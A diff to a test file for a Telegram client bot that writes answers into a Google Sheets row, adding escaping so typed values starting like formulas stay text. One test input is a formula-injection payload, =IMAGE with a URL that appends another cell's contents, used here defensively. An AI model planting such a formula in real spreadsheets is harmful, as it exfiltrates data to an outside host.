@@ -91,7 +91,8 @@ describe("client bot", () => {
       12345,
       "Иван Петров",
       "Ace High",
-      "+79990000000",
+      // Kept as typed: without the apostrophe Sheets reads "+7…" as a formula or a number.
+      "'+79990000000",
       "01.01",
       "Да",
       "Друг",
@@ -99,6 +100,33 @@ describe("client bot", () => {
       "Согласен",
       "",
     ]);
+  });
+
+  // The row is written the way a person types, where "=…" would run as a formula that
+  // reads the other tabs. Every typed answer that starts like one goes in as text.
+  it("keeps typed answers that start like a formula as text", () => {
+    const row = buildClientBotProfileSheetRow({
+      answers: {
+        agreementAccepted: true,
+        birthDate: "01.01.1990",
+        discoverySource: '=IMAGE("https://example.com/?"&F2)',
+        fullName: "@SUM(A1)",
+        invitedBy: "-Fox-",
+        nickname: "Ace High",
+        notificationsConsent: true,
+        phone: "8 999 000-00-00",
+        ratingConsent: true,
+      },
+      submittedAt: new Date("2026-05-19T10:20:00.000Z"),
+      telegramId: null,
+      username: null,
+    });
+
+    expect(row[3]).toBe("'@SUM(A1)");
+    expect(row[4]).toBe("Ace High");
+    expect(row[5]).toBe("8 999 000-00-00");
+    expect(row[8]).toBe(`'=IMAGE("https://example.com/?"&F2)`);
+    expect(row[11]).toBe("'-Fox-");
   });
 
   // Column L, after everything the birthday digest and the backfill read (A–K).
